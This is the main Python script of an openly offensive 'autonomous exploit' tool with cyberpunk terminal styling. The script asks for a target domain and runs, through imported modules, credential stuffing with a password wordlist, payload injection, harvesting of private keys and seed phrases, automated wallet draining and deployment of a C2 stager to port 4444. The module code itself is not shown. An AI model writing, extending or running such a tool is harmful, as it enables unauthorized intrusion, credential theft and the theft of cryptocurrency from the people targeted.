import asyncio
import sys
import time
import random
from modules.loader import load_wordlist
from modules.parser import parse_target_source
from modules.engine import run_autonomous_engine
from modules.replayer import replay_and_inject_payloads
from modules.dumper import harvest_email_intelligence
from modules.mail import send_breach_alert
from modules.payloads import deploy_c2_stager
from modules.keyharvester import harvest_private_keys
from modules.drainer import check_and_drain_wallet

# Cyberpunk Neon & Matrix Color Palette
CYAN = "\033[96m"
GREEN = "\033[92m"
MAGENTA = "\033[95m"
YELLOW = "\033[93m"
RED = "\033[91m"
DARK_GRAY = "\033[90m"
RESET = "\033[0m"
BOLD = "\033[1m"
BLINK = "\033[5m"
MATRIX_GREEN = "\033[38;5;46m"
NEON_BLUE = "\033[38;5;51m"

# Glitch character set for high-tech terminal output
GLITCH_CHARS = "█▓▒░⌖⚡⚙🜲🜏ØΨ⚡§"

BANNER = f"""{MATRIX_GREEN}{BOLD}
 ██████╗ ██████╗ ██╗   ██╗████████╗███████╗██████╗  ██████╗  ██████╗ 
 ██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔══██╗██╔═══██╗██╔════╝ 
 ╚═╝     ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═════╝  ╚═════╝  ╚═════╝ 
{RESET}{NEON_BLUE}═════════════════════════════════════════════════════════════
   [ROGUE_SYS // NEURAL RECON & AUTONOMOUS EXPLOIT KERNEL V4.9]
═════════════════════════════════════════════════════════════{RESET}
"""

def cyber_print(text, delay=0.015, color=MATRIX_GREEN):
    """Types text out character-by-character with automated terminal scrolling."""
    for char in text:
        sys.stdout.write(f"{color}{char}{RESET}")
        sys.stdout.flush()
        time.sleep(delay)
    sys.stdout.write("\n")
    sys.stdout.flush()
    # Force automatic scroll down to keep output in view on mobile
    sys.stdout.write("\033[1S")

def matrix_pulse_loader(message, duration=0.6):
    """Displays a futuristic telemetry matrix loading sequence."""
    end_time = time.time() + duration
    while time.time() < end_time:
        glitch_str = "".join(random.choice(GLITCH_CHARS) for _ in range(12))
        sys.stdout.write(f"\r{DARK_GRAY}[{glitch_str}] {message} {random.randint(1000,9999)}{RESET}")
        sys.stdout.flush()
        time.sleep(0.08)
    sys.stdout.write(f"\r\033[K")

def main():
    # Clear screen and jump to top for crisp launch
    sys.stdout.write("\033[2J\033[H")
    print(BANNER)
    
    # Futuristic input prompt with telemetry styling
    cyber_print(f"{NEON_BLUE}[SYS_CORE] >> INITIALIZING NEURAL INTERFACE...", 0.01)
    raw_target = input(f"{MATRIX_GREEN}{BOLD}[ROGUE_PROMPT] ⚡ Target Host/Domain (e.g., target.com): {RESET}").strip()
    
    if not raw_target:
        cyber_print(f"{RED}[CRITICAL_FAULT] Target parameter missing. Aborting protocol.{RESET}", 0.01)
        sys.exit(1)

    target = raw_target
    if target.startswith("http://"):
        target = target[7:]
    elif target.startswith("https://"):
        target = target[8:]
    target = target.split('/')[0].split(':')[0]

    matrix_pulse_loader("ISOLATING_TARGET_VECTOR...", 0.5)
    cyber_print(f"{NEON_BLUE}[*] Target cleanly locked: {target}{RESET}", 0.01)
    cyber_print(f"{YELLOW}[INIT] Injecting payloads & mounting local dictionaries...{RESET}", 0.01)
    
    try:
        passwords = load_wordlist("config/passwords.txt")
    except Exception as e:
        cyber_print(f"{RED}[ERROR] Wordlist mount failed: {e}{RESET}", 0.01)
        sys.exit(1)

    cyber_print(f"{MATRIX_GREEN}[SUCCESS] Wordlist Secured : {len(passwords)} candidate vectors loaded.{RESET}", 0.01)

    # Step 1: Real-time DOM Inspection & Security Header Audit
    matrix_pulse_loader("SCANNING_DOM_AND_SECURITY_HEADERS...", 0.4)
    try:
        asyncio.run(parse_target_source(target))
    except Exception as e:
        cyber_print(f"{YELLOW}[!] Notice during DOM parse: {e}{RESET}", 0.01)

    cyber_print(f"\n{MAGENTA}{BOLD}[ENGINE] Spawning asynchronous background threads & evaluation grid...\n{RESET}", 0.01)
    time.sleep(0.3)

    # Step 2: Launch Heavy Autonomous Engine (TCP Telemetry, Fuzzing, Surface Mapping, Credential Stuffing)
    hits, duration = asyncio.run(run_autonomous_engine(target, passwords))

    # Adaptive Pivot: If primary brute-force yields nothing, immediately trigger async replayer/injection
    if not hits:
        cyber_print(f"{YELLOW}[*] Primary perimeter held. Engaging neural payload injection & replaying...{RESET}", 0.01)
        asyncio.run(replay_and_inject_payloads(target))

    # Step 3: Post-Exploitation, Cryptographic Key Harvesting & Financial Sweep
    matrix_pulse_loader("EXECUTING_POST_EXPLOITATION_SWEEP...", 0.5)
    cyber_print(f"\n{MATRIX_GREEN}[+] Initiating deep cryptographic asset harvesting & financial audit...{RESET}", 0.01)
    
    # 1. Harvest Private Keys & Seed Phrases (Plaintext reports)
    keys_found = harvest_private_keys(".")
    
    # 2. Universal Multi-Asset Check & Automated Drainer Sweep
    drain_results = []
    for key in keys_found:
        key_content = key.get("key_content")
        key_type = key.get("type")
        
        cyber_print(f"\n{YELLOW}[*] Processing harvested artifact [{key_type}] for balance audit...{RESET}", 0.01)
        try:
            bal, drained, tx = check_and_drain_wallet(key_content)
            drain_results.append({
                "type": key_type,
                "artifact": key_content[:15] + "...", 
                "balance": bal, 
                "drained": drained, 
                "tx": tx
            })
        except Exception as e:
            cyber_print(f"{RED}[-] Drainage routing error for artifact: {e}{RESET}", 0.01)

    # 3. Dispatch Encrypted Email Alerts (if hits exist)
    for hit in hits:
        try:
            send_breach_alert(target, hit)
        except Exception:
            pass
        
    # 4. Deploy Mobile C2 Stager Package
    try:
        deploy_c2_stager("10.0.0.100", 4444)
    except Exception:
        pass

    # Cyberpunk Completion Dashboard
    cyber_print(f"\n{NEON_BLUE}═════════════════════════════════════════════════════════════{RESET}", 0.005)
    cyber_print(f"{BOLD}{MATRIX_GREEN}[*] MISSION STATUS: COMPLETE (Elapsed: {duration:.2f}s){RESET}", 0.01)
    
    if hits:
        cyber_print(f"{BOLD}{BLINK}[+++] BREACH DETECTED: {len(hits)} authorization vectors successfully bypassed!{RESET}", 0.01)
        for idx, hit in enumerate(hits, 1):
            cyber_print(f" {MATRIX_GREEN}├── Vector [{idx}]: Port {hit.get('port')} | Type: {hit.get('type')}", 0.01)
            cyber_print(f" │    User: {hit.get('user')} | Key: {hit.get('password')}{RESET}", 0.01)
    else:
        cyber_print(f"{YELLOW}[---] Adaptive engagement concluded. Harvest reports compiled in plaintext.{RESET}", 0.01)
    
    cyber_print(f"{NEON_BLUE}═════════════════════════════════════════════════════════════{RESET}\n", 0.005)

if __name__ == "__main__":
    main()
